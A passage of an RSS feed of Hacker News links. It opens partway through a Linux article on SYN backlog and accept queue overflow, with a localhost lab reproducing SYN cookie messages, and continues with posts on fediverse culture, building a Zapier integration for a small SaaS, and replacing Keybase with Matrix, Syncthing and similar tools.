<p>In the default configuration where the backlog overflows and SYN cookies are sent, the kernel increments the <code>TCPReqQFullDoCookies</code> counter and logs this line to the kernel log, which is often confused for an indicator of a real SYN flood even when it’s just due to legitimate connections coming in too fast:</p>
<div><div><pre><code>TCP: request_sock_TCP: Possible SYN flooding on port 8080. Sending cookies.  Check SNMP counters.
</code></pre></div></div>

<p>If SYN cookies are explicitly disabled, the kernel increments the <code>TCPReqQFullDrop</code> counter and the following would be logged instead:</p>
<div><div><pre><code>TCP: request_sock_TCP: Possible SYN flooding on port 8080. Dropping request.  Check SNMP counters.
</code></pre></div></div>

<p>If you see this message for internal service-to-service connections, chances are you’re dealing with a scaling problem or a <a href="https://en.wikipedia.org/wiki/Thundering_herd_problem">thundering herd problem</a>, and not an actual SYN flood or intentional bad actor.</p>

<p>Those “SNMP Counters” that the kernel mentions are available in <code>nstat</code> in the network namespace:</p>
<div><div><pre><code>$ nstat -a | grep TCPReqQFull
TcpExtTCPReqQFullDoCookies      706                0.0
</code></pre></div></div>

<h3 id="syn-backlog-in-the-lab">SYN backlog in the lab</h3>

<p>To see how the SYN backlog behaves in the lab, we can simulate latency on local connections with the following:</p>
<div><div><pre><code>vagrant@blog-lab-scaling-accept:~$ sudo /vagrant/reset-lab.sh
vagrant@blog-lab-scaling-accept:~$ sudo tc qdisc add dev lo root netem delay 200ms
vagrant@blog-lab-scaling-accept:~$ ping 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=401 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=400 ms
</code></pre></div></div>

<p>This means we can now simulate overflowing the SYN backlog. To make it a bit easier to reproduce, reduce the size of the SYN backlog from the default of <code>128</code> by reducing <code>net.core.somaxconn</code> (because SYN cookies are enabled):</p>
<div><div><pre><code>vagrant@blog-lab-scaling-accept:~$ sudo sysctl net.core.somaxconn
net.core.somaxconn = 128
vagrant@blog-lab-scaling-accept:~$ sudo sysctl -w net.core.somaxconn=10
net.core.somaxconn = 10
vagrant@blog-lab-scaling-accept:~$ sudo systemctl restart nginx
vagrant@blog-lab-scaling-accept:~$ 
</code></pre></div></div>

<p>At this point, if more than 10 connections arrive within 400ms (before the SYN-ACK and ACK handshake complete), then 10 connections will be in the SYN backlog, which is the maximum configured. This will trigger SYN cookies to be sent, triggering the message and counters above. Let’s test out if this works, run a simulation that opens N concurrent connections:</p>
<div><div><pre><code>vagrant@blog-lab-scaling-accept:~$ python /vagrant/test_send_concurrent_connections.py 127.0.0.1:80 20
Waiting, Ctrl+C to exit.
</code></pre></div></div>

<p>And verify that SYN cookies were sent as expected:</p>
<div><div><pre><code>vagrant@blog-lab-scaling-accept:~$ sudo dmesg -c
[ 2571.784749] TCP: request_sock_TCP: Possible SYN flooding on port 80. Sending cookies.  Check SNMP counters.
vagrant@blog-lab-scaling-accept:~$ sudo nstat | grep ReqQ
TcpExtTCPReqQFullDoCookies      10                 0.0
vagrant@blog-lab-scaling-accept:~$
</code></pre></div></div>

<p>Try disabling the simulated latency with <code>sudo tc qdisc del dev lo root</code> and re-run the same test, now connections move through fast enough that SYN cookies are not sent.</p>

<p>This also demonstrates the way the Round Trip Time effects the amount of connections that can burst into a LISTEN socket - <code>test_send_concurrent_connections.py</code> does actually attempt to initiate complete connections and <code>nginx</code> on the other end is readily calling <code>accept()</code> as fast as it can, but because 20 connections are initiated at once, 20 SYN packets arrive before any handshake can continue, and the SYN backlog overflows. You can imagine that in the real world, with some of these values often defaulting to <code>128</code>, and users often being far away from servers (on the other side of the world), it’s pretty easy to accidentally trigger this scenario without a true SYN flood.</p>

<h2 id="accept-queue">Accept queue</h2>

<p>Once an ACK packet is received and validated, a new client connection is ready for the application to process. This connection is moved into the accept queue, waiting for the application to call <code>accept()</code> and receive it.</p>

<p>Unlike the SYN backlog, the accept queue has no backup plan for when it overflows. Back in the original call to <code>listen()</code>, a <code>backlog</code> argument was provided, which indicates how many connections can have completed the 3-way handshake and be waiting in the kernel for the application to accept.</p>

<p>This is the first common issue: If the <code>backlog</code> number provided to <code>listen()</code> is not large enough to contain any number of connections that could reasonably complete their handshake between 2 calls to <code>accept()</code>, then a connection will be dropped on the floor, and the application generally won’t even notice - the next call to …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://theojulienne.io/2020/07/03/scaling-linux-services-before-accepting-connections.html">https://theojulienne.io/2020/07/03/scaling-linux-services-before-accepting-connections.html</a></em></p>]]>
            </description>
            <link>https://theojulienne.io/2020/07/03/scaling-linux-services-before-accepting-connections.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23729072</guid>
            <pubDate>Sat, 04 Jul 2020 00:58:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[So you want to make it on the fediverse?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23728893">thread link</a>) | @lowmemcpu
<br/>
July 3, 2020 | https://yarmo.eu/post/make-it-on-fediverse | <a href="https://web.archive.org/web/*/https://yarmo.eu/post/make-it-on-fediverse">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>That's the plan, right? A whole new world awaits you on the fediverse, and you are going to make it there! There's something you should know.</p>
<!--more-->
<h2>Welcome to the Fediverse</h2>
<p>Whenever I talk to people in my surroundings about the fediverse and try to convince them to use it, I have a go-to story that I tell. On multiple occasions in the past, there have been real-life events that sparked controversy on Twitter which then responded by banning some public figure or doing something else to upset a portion of the population. In turn, this would lead to either that public figure or a social movement to incite people to leave Twitter and join a safer and more open alternative: the fediverse. As citizens of the fediverse, we would notice a massive influx of new users and a stream of introductory messages on our timelines. Which, in my humble opinion, is always a welcome sight. An interesting observation is that the first message by these new citizens is often a little… "off" if you are used to being on the fediverse.</p>
<p>Allow me to elaborate. The introductory message of Twitter exiles often reads as follows: "Hello all! I am [insert name here], I am going to post messages about [insert multiple topics here]. Who are the people I should follow?".</p>
<p>The message above oozes "Twitter Mentality". To explain what I mean, let me use an analogy.</p>
<h2>The analogy</h2>
<p>Twitter is a metropole. Its users all share the same playing field. If you want to participate, you don't talk, you shout. How else are you going to be heard in a crowd of millions? Once you start shouting, quiet people start to listen. This creates a one-to-many dynamic.</p>
<p>The fediverse is a network of well-connected villages. As part of a village, you get to know people. You talk to people because it's less crowded, there's less competition. It's still a network so you can connect to people multiple villages away with the same ease. But the noise is filtered. You are surrounded by people who share a common interest which is the reason you decided to live in that specific village in the first place, but you still get the network effect and communicate with people outside of the village because you want to, because you can. This creates a one-to-one or on a larger scale, many-to-many dynamic.</p>
<h2>What makes a network social?</h2>
<p>My argument is that a one-to-many network is not a social network, it's broadcasting. Having "influencers" on a network is, if anything, anti-social. This is where I need to go back to that initial message by the Twitter exile. There's no need to announce you are going to talk about a certain topic, just do it. I will not follow you because you are announcing to post messages about a certain topic. Post a message, let's debate and talk about it and if I am truly interested in your opinion and reasonings, only then will I follow you. And don't follow people because many others do; follow them because you want to, because you get the choice.</p>
<p>This is my opinion and I have talked to many sharing the same sentiment. This many-to-many dynamic is what makes the fediverse appealing. You get a Home timeline where you will find posts from people you follow and actually want to hear from. You get a Local Timeline filled with posts from people you don't always know, but it's the same instance/village, so you already share a common ground. And for when you feel like exploring, you get a Known Network timeline filled with all sorts of posts.</p>
<p>You may argue that building this whole narrative around a simple introductory post is flimsy, and I agree. Not everyone's first post is like that, and even if it were, there are different ways of interpreting the content. But it's something I found people can relate to, it's a bridge between two mentalities, two social structures that I can use to introduce the many advantages of the fediverse.</p>
<p>If you would like actually useful information on starting with the fediverse with Mastodon, please have a look at this <a href="https://kevq.uk/how-does-mastodon-work/">blog post by KevQ</a>.</p></div></div>]]>
            </description>
            <link>https://yarmo.eu/post/make-it-on-fediverse</link>
            <guid isPermaLink="false">hacker-news-small-sites-23728893</guid>
            <pubDate>Sat, 04 Jul 2020 00:25:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Integrating with the Zapier API as a Small SaaS]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23728877">thread link</a>) | @CoreSet
<br/>
July 3, 2020 | https://formcake.com/blog/integrating-with-zapier | <a href="https://web.archive.org/web/*/https://formcake.com/blog/integrating-with-zapier">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>We <em>just</em> launched our integration with Zapier and have some thoughts to share on the process.</p>
<p>If you haven't heard of Zapier then you've probably never been asked to integrate your company’s API to a 3rd party product “as quickly as possible.” Zapier has become the API platform for the web and - as a company who takes in data and sheperds it through to other workflows - it was a no brainer to integrate Formcake with Zapier. Integration was straightforward enough, but still a bit of a journey, so hopefully these details that may interest those looking to do the same and shorten their learning curve a bit.</p>
<p>So what does Zapier ask from its integration partners? And what decisions did we have to make accommodate those requirements? Here is our list of top concerns.</p>
<h2 id="1-authenticating-with-zapier">1) Authenticating with Zapier</h2>
<p>Zapier obviously needs a way to communicate with your app. The two options that we considered were OAuth2 and JTW tokens. We love OAuth2 with all of its control and flexibility. Honestly it would have been a great choice for Zapier. We however ended up choosing JWT instead. With OAuth2's power comes complexity and as a small SaaS app we wanted to keep things simple. Yes, having the user connect Zapier to Formcake would have been a little more straightforward, but we also knew that we did not want to use OAuth2 for our forthcoming user API. This API will allow users to access their data simply and securely and if you have ever had to use OAuth2 for an API where you just want to make a GET request, you many identify with our thinking. In our case, we adopted a new, Zapier-specific JWT strategy that lives alongside our existing JWT auth system.</p>
<p>With our new JWT auth token system, Formcake users can navigate to API Keys, create a Zapier API Key, and plug it into Zapier. They can also see the last time a key was used and can revoke those keys that are no longer needed or have become compromised. This worked particularly well for us because it dovetails nicely into the necessary infrastructure for our user API and we think our users will appreciate the simple process of passing a JTW token with API requests. It will also be extensible should we want to integrate more tightly with any other systems in the future.</p>
<h3 id="creating-your-token-in-formcake">Creating Your Token in Formcake:</h3>
<p><img src="https://formcake.com/images/blog-posts/formcake-create-zapier-key.png" alt="Creating your token in Formcake"></p>
<p><img src="https://formcake.com/images/blog-posts/formcake-keys.png" alt="Formcake api keys"></p>
<h3 id="logging-into-formcake">Logging Into Formcake:</h3>
<p><img src="https://formcake.com/images/blog-posts/zapier-key-login.png" alt="Logging into formcake"></p>
<h2 id="2-polling-vs-webhook-trigger">2) Polling vs Webhook Trigger</h2>
<p>When you are setting up your Zapier integration, you have the option to create one of two types of "Triggers". You can either have Zapier regularly poll an endpoint in your API and then propagate any new changes it finds, or you can communicate with Zapier via webhooks, pushing out anything new on your end and triggering an immediate response.</p>
<p><img src="https://formcake.com/images/blog-posts/zapier-trigger-types.png" alt="Zapier polling vs webhook trigger options"></p>
<p>Of course for something like a form, the webhook method is critical, since when your form receives a submission you want it to, you know, <em>do</em> something, instead of quietly waiting for Zapier to get in touch. For those considering these options, know that creating a webhook system is not always the right choice. Creating a Polling Trigger is far more simple than creating a Webook Trigger. For data that does not change very often or has a limited set of data, polling can get your integration off the ground much faster and may be you all that you ever need. For Formcake's purposes, we knew that users would want to see something happen in Zapier immediately, especially when first creating and debugging their integration. A form could also have thousands of submissions, making polling simply not an option since Zapier would have to poll all submissions each time, creating a slower and slower process as our users get more and more value out of their forms.</p>
<h2 id="3-enable--disable">3) Enable / Disable</h2>
<p>Note that even with the webhook system in place, where we send data to Zapier instead of Zapier hitting our API, we still need to provide Zapier a way to authenticate with our app beyond simply logging the user in. This is because Zapier requires something else - a way to enable and disable webooks within our app. Zapier asks that you provide <code>/subscribe</code> and <code>/unsubscribe</code> endpoints that will turn your webhooks on and off. The <code>/subscribe</code> endpoint is meant to activate your webhook and also provide a webhook url to send your data to Zapier. This webhook url corresponds to a Zap in Zapier. The <code>/unsubscribe</code> endpoint simply turns off your webhook.</p>
<p>Within Formcake, these endpoints toggle an action's <code>active</code> property and also store the Zapier webhook url. On our own end, we use the <code>active</code> property in our own app frontend so that users can see on both platforms whether a Zap has been successfully connected. Zapier requires unsubscribing so that your app does not send data to Zapier after a Zap has been paused or deleted. Can you imagine the amount of unuseful API requests Zapier would recieve if they did not reserve the right to turn off your app's webhooks?</p>
<h3 id="formcakes-subscribe-and-unsubscribe-endpoint-definitions-in-zapier">Formcake's Subscribe and Unsubscribe Endpoint Definitions in Zapier:</h3>
<p>A snippet of Zapier <code>/subscribe</code> and <code>/unsubscribe</code> endpoints code.</p>
<p><img src="https://formcake.com/images/blog-posts/zapier-subscribe-unsubscribe.png" alt="Zapier subscribe and unsubscribe"></p>
<h3 id="a-zapier-action-unconnected-and-connected">A Zapier Action Unconnected and Connected</h3>
<p>A look at how we show the connected status of Zaps.</p>
<p><img src="https://formcake.com/images/blog-posts/zapier-not-connected-to-action.png" alt="Zapier unconnected"></p>
<p><img src="https://formcake.com/images/blog-posts/zapier-connected-to-action.png" alt="Zapier connected"></p>
<h2 id="4-preform-list-trigger">4) "Preform List" Trigger</h2>
<p>After giving Zapier a way to enable or disable your webhooks, your app also needs to provide a way to pull an example of whatever data your app will send to Zapier. This is accomplished in Zapier by using a Polling Trigger, but one that is not visible to the public and is only meant for other Zapier Triggers to use in order to get a list of information. In Zapier this is called a "Preform List" endpoint and is entirely optional. We would advise those making an integration use this option since it makes your Zapier integration far more useful. For Formcake, this endpoint returns a form's last 5 submissions.</p>
<h3 id="zapier-preform-list-in-action">Zapier Preform List In Action:</h3>
<p><img src="https://formcake.com/images/blog-posts/zapier-preform-list.png" alt="Zapier preform list"></p>
<h2 id="5-marketing-your-integration-beta-to-searchable">5) Marketing Your Integration (Beta to Searchable)</h2>
<p>After you are satisfied with your Zapier integration, you then need to develop a launch strategy in order to get your integration approved. Anyone is allowed to create a private integration but in order to have your integration publicly searchable on Zapier you have to satisfy a couple of requirements. Some of these are practical like providing a support contact so that Zapier can pass along support requests, but the real hurtle is getting 50 users to start using the integration. Zapier gives you access to a link that allows you to invite users to your integration. With this link users can beta test your Zap and you can tweak it to your users needs before submitting it to Zapier.</p>
<p><img src="https://formcake.com/images/blog-posts/zapier-share-page.png" alt="Zapier preform list"></p>
<h2 id="next-steps">Next Steps</h2>
<p>Formcake's Zapier integration is currently in beta so go ahead and <a href="https://formcake.com/documentation/actions#zapier-action">try it out</a>! Formcake's free plan nicely syncs up with Zapier's where each allow you 100 free submissions per month. If you have any feedback for the integration, please reach out to us at <a href="mailto:contact@formcake.com">contact@formcake.com</a>.</p>
</div></div>]]>
            </description>
            <link>https://formcake.com/blog/integrating-with-zapier</link>
            <guid isPermaLink="false">hacker-news-small-sites-23728877</guid>
            <pubDate>Sat, 04 Jul 2020 00:23:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Replace Keybase in 3 Easy Steps]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 2 (<a href="https://news.ycombinator.com/item?id=23728832">thread link</a>) | @figbert
<br/>
July 3, 2020 | https://figbert.com/posts/how-to-replace-keybase-in-three-easy-steps | <a href="https://web.archive.org/web/*/https://figbert.com/posts/how-to-replace-keybase-in-three-easy-steps">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><a href="https://figbert.com/posts/how-to-replace-keybase-in-three-easy-steps" rel="me">FIGBERT</a> <section> <p>Published by  on <time datetime="2020-07-03">7/3/2020</time></p> </section> <p>Ever since <a href="https://keybase.io/blog/keybase-joins-zoom" rel="noopener noreferrer" target="_blank">Keybase was acquired by Zoom</a>, a <a href="https://medium.com/bugbountywriteup/zoom-zero-day-4-million-webcams-maybe-an-rce-just-get-them-to-visit-your-website-ac75c83f4ef5" rel="noopener noreferrer" target="_blank">company</a> <a href="https://theintercept.com/2020/03/31/zoom-meeting-encryption/" rel="noopener noreferrer" target="_blank">with</a> <a href="https://twitter.com/c1truz_/status/1244737672930824193" rel="noopener noreferrer" target="_blank">a</a> <a href="https://protonmail.com/blog/zoom-privacy-issues/" rel="noopener noreferrer" target="_blank">very</a> <a href="https://www.axios.com/zoom-closes-chinese-user-account-tiananmen-square-f218fed1-69af-4bdd-aac4-7eaf67f34084.html" rel="noopener noreferrer" target="_blank">bad</a> <a href="https://twitter.com/nicoagrant/status/1268020841054269440" rel="noopener noreferrer" target="_blank">history</a> <a href="https://citizenlab.ca/2020/04/move-fast-roll-your-own-crypto-a-quick-look-at-the-confidentiality-of-zoom-meetings/" rel="noopener noreferrer" target="_blank">with</a> <a href="https://twitter.com/DanAmodio/status/1245329512889487361" rel="noopener noreferrer" target="_blank">security</a>/<a href="https://twitter.com/Ouren/status/1241398181205889024" rel="noopener noreferrer" target="_blank">privacy</a>, <a href="https://news.ycombinator.com/item?id=23103386" rel="noopener noreferrer" target="_blank">people wanted an alternative</a>. There have been a few different alternatives proposed: this is <del>the best</del> mine.</p>  <section><p>Ever since <a href="https://keybase.io/blog/keybase-joins-zoom" rel="noopener noreferrer" target="_blank">Keybase was acquired by Zoom</a>, a <a href="https://medium.com/bugbountywriteup/zoom-zero-day-4-million-webcams-maybe-an-rce-just-get-them-to-visit-your-website-ac75c83f4ef5" rel="noopener noreferrer" target="_blank">company</a> <a href="https://theintercept.com/2020/03/31/zoom-meeting-encryption/" rel="noopener noreferrer" target="_blank">with</a> <a href="https://twitter.com/c1truz_/status/1244737672930824193" rel="noopener noreferrer" target="_blank">a</a> <a href="https://protonmail.com/blog/zoom-privacy-issues/" rel="noopener noreferrer" target="_blank">very</a> <a href="https://www.axios.com/zoom-closes-chinese-user-account-tiananmen-square-f218fed1-69af-4bdd-aac4-7eaf67f34084.html" rel="noopener noreferrer" target="_blank">bad</a> <a href="https://twitter.com/nicoagrant/status/1268020841054269440" rel="noopener noreferrer" target="_blank">history</a> <a href="https://citizenlab.ca/2020/04/move-fast-roll-your-own-crypto-a-quick-look-at-the-confidentiality-of-zoom-meetings/" rel="noopener noreferrer" target="_blank">with</a> <a href="https://twitter.com/DanAmodio/status/1245329512889487361" rel="noopener noreferrer" target="_blank">security</a>/<a href="https://twitter.com/Ouren/status/1241398181205889024" rel="noopener noreferrer" target="_blank">privacy</a>, <a href="https://news.ycombinator.com/item?id=23103386" rel="noopener noreferrer" target="_blank">people wanted an alternative</a>. There have been a few different alternatives proposed: this is <del>the best</del> mine.</p> <h2 id="-what-is-keybase">## What is Keybase?</h2> <p>Before we talk about replacing <a href="https://keybase.io/" rel="noopener noreferrer" target="_blank">Keybase</a>, we should have a good idea of what Keybase actually is. It's main features are as follows (ordered as on the website):</p> <ul> <li>E2EE chats and messaging (people and teams).</li> <li>Cryptographic identity verification from around the net.</li> <li><a href="https://book.keybase.io/docs/files" rel="noopener noreferrer" target="_blank">KBFS</a> (Public signed file hosting, private E2EE file storage w/ sharing, <a href="https://book.keybase.io/docs/files#keybase-pub" rel="noopener noreferrer" target="_blank">Static site hosting??</a>)</li> <li>Git repositories? Crypto? <a href="https://saltpack.org/" rel="noopener noreferrer" target="_blank">An alternative to PGP?</a></li> </ul> <h2 id="-previous-attempts-to-replace-keybase">## Previous Attempts to Replace Keybase</h2> <p>I'm not the first person to try this, obviously. Some brave folks have tried to build Keybase alternatives, such as <a href="https://keys.pub/" rel="noopener noreferrer" target="_blank">keys.pub</a> and the brand-new <a href="https://keyoxide.org/" rel="noopener noreferrer" target="_blank">Keyoxide</a>. I've tried both, but found that though they both are good in their own right, they are not the solutions that I am looking for.</p> <h2 id="-ok-time-for-the-steps">## OK Time for the Steps</h2> <h3 id="-step-1-chatmessaging">### Step #1: Chat/Messaging</h3> <p>There are a few great pre-existing options for encrypted messaging: <a href="https://signal.org/" rel="noopener noreferrer" target="_blank">Signal</a>, <a href="https://beta.protonmail.com/" rel="noopener noreferrer" target="_blank">ProtonMail</a> if you want to go full email, <a href="https://telegram.org/" rel="noopener noreferrer" target="_blank">Telegram</a>, and <a href="https://www.whatsapp.com/" rel="noopener noreferrer" target="_blank">WhatsApp</a>. However, they all have their problems (though I use the first two on a daily basis). Signal requires a phone number, and is more of an iMessage/text replacement than a Slack-style chat app. Protonmail is literally not chat – it's email. Telegram is <a href="https://news.ycombinator.com/item?id=6936539" rel="noopener noreferrer" target="_blank">not</a> <a href="https://translate.google.com/translate?hl=en&amp;sl=ru&amp;u=http://habrahabr.ru/post/206900/" rel="noopener noreferrer" target="_blank">secure</a>. If you use WhatsApp for security you might be crazy –&nbsp;I only use it because it's <em>the way</em> to communicate with people in the Middle East and Africa.</p> <p>Instead, I would recommend you use <a href="https://matrix.org/" rel="noopener noreferrer" target="_blank"><strong>Matrix</strong></a>. Matrix is an "open network for secure, decentralized communication," and it's the perfect replacement for Keybase's chat <del>and I would argue most other chat apps too</del>. It utilizes E2E encrypted messaging, and can be self-hosted as well <del>or if you're cheap like me just get your friend to host</del>.</p> <p>In addition to a Matrix server, you also need a client. For this, I recommend <a href="https://about.riot.im/" rel="noopener noreferrer" target="_blank"><strong>Riot</strong></a>. Riot is a beautiful Matrix client with a bunch of awesome features, including Slack-like integrations, and apps for pretty much every major platform (Linux, MacOS, Windows, iOS, Android, and a web client). <del>Plus it looks a lot like Discord.</del></p> <h3 id="-step-2-identity-verification">### Step #2: Identity verification</h3> <p>Replacing Keybase's <a href="https://web.archive.org/web/20140322062148/https://keybase.io/" rel="noopener noreferrer" target="_blank">original function</a> is probably the most difficult part of this tutorial: cryptographically verified identity proofs is a great and innovative idea. I would swap this out with an <a href="https://indieweb.org/" rel="noopener noreferrer" target="_blank"><strong>IndieWeb</strong></a> profile –&nbsp;one <a href="http://microformats.org/wiki/h-card" rel="noopener noreferrer" target="_blank">part</a> of the larger <a href="http://microformats.org/" rel="noopener noreferrer" target="_blank">microformats</a> HTML structure. There are some pretty great tutorials out there (I would recommend <a href="https://kevq.uk/how-to-create-an-indieweb-profile/" rel="noopener noreferrer" target="_blank">this one</a> by the fantastic <a href="https://kevq.uk/" rel="noopener noreferrer" target="_blank">Kev Quirk</a> and <a href="https://randomgeekery.org/post/2020/04/indieweb-h-cards/" rel="noopener noreferrer" target="_blank">this one</a> by <a href="https://randomgeekery.org/" rel="noopener noreferrer" target="_blank">Brian Wisti</a>), so I won't go into too much detail about exactly how to do that. However, it's important to note that though Kev recommends hiding your h-card with the <code>display: none;</code> property: <a href="https://indieweb.org/antipatterns#invisible_metadata" rel="noopener noreferrer" target="_blank">don't do that</a>. I just merged my about and contact pages onto my homepage, and added the microformats classes to my existing markup.</p> <p><img alt="My IndieWeb h-card" src="https://figbert.com/content/posts/how-to-replace-keybase-in-three-easy-steps/h-card.png"></p> <h3 id="-step-3-file-storage">### Step #3: File Storage</h3> <p>Replacing KBFS is easy to do, but hard to get right. Swapping to <a href="https://www.google.com/drive/" rel="noopener noreferrer" target="_blank">Google Drive</a> is probably the move that most people would make, but that abandons the entire security/encryption aspect of Keybase. There's also <a href="https://www.dropbox.com/" rel="noopener noreferrer" target="_blank">Dropbox</a>, but that has the same problems as above. <a href="https://twitter.com/ProtonMail/status/1278389663078768641" rel="noopener noreferrer" target="_blank">ProtonDrive</a> has potential, but it's not out yet. Enter <a href="https://syncthing.net/" rel="noopener noreferrer" target="_blank"><strong>Syncthing</strong></a>. <a href="https://tonsky.me/blog/syncthing/" rel="noopener noreferrer" target="_blank">Nikita Tonsky</a> wrote one of my favorite posts of all time about Syncthing – go read it. One reason Syncthing is so great is that it's not the same thing as KBFS or any of the other "Drive" solutions. Instead of being a file hosting system, it's a "continuous file synchronization program." You have no data limits other than your storage and no third-party to worry about. Plus, sharing folders is also incredibly easy. Just read the article.</p> <h3 id="-bonus-step-4-video-calling">### Bonus Step #4: Video Calling</h3> <p>It would be a shame to talk about text chat, or really any form of communication, in this new pandemic age without talking about video chat. After all, the whole reason I'm writing this article is because the new videocalling giant <a href="https://zoom.us/" rel="noopener noreferrer" target="_blank">Zoom</a>. So, how have I replaced Zoom and how does that relate to replacing Keybase? Well, Matrix happens to have a fantastic <a href="https://jitsi.org/" rel="noopener noreferrer" target="_blank">Jitsi Meet</a> <a href="https://matrix.org/blog/2020/04/06/running-your-own-secure-communication-service-with-matrix-and-jitsi" rel="noopener noreferrer" target="_blank">integration</a>. Plus, the folks over at Jitsi are <a href="https://jitsi.org/blog/e2ee/" rel="noopener noreferrer" target="_blank">working on E2E encryption for their calls</a>. I've integrated Jitsi Meet into my self-hosted instance of Matrix, and now all my videocalls are just that – mine!</p> <h2 id="-summary">## Summary</h2> <ul> <li>Swapped chat to Matrix and Riot.</li> <li>Swapped identity verification to Indieweb.</li> <li>Swapped file storage/sync to Syncthing.</li> <li>Added videocalling to chat program via Jitsi.</li> </ul> <h2 id="-conclusion">## Conclusion</h2> <p>Keybase is a great service, and the people who work there should be really proud of what they've built. However, given Zoom's aquisition of the company, the stability and security of the product have been called into question. So, ever one to hop on a hype train, I jumped ship. I'm really happy with my solution, and I'd love to hear your thoughts as well <del>as soon as I set up webcomments</del>.</p> </section></article></div>]]>
            </description>
            <link>https://figbert.com/posts/how-to-replace-keybase-in-three-easy-steps</link>
            <guid isPermaLink="false">hacker-news-small-sites-23728832</guid>
            <pubDate>Sat, 04 Jul 2020 00:15:09 GMT</pubDate>
        </item>
    </channel>
</rss>
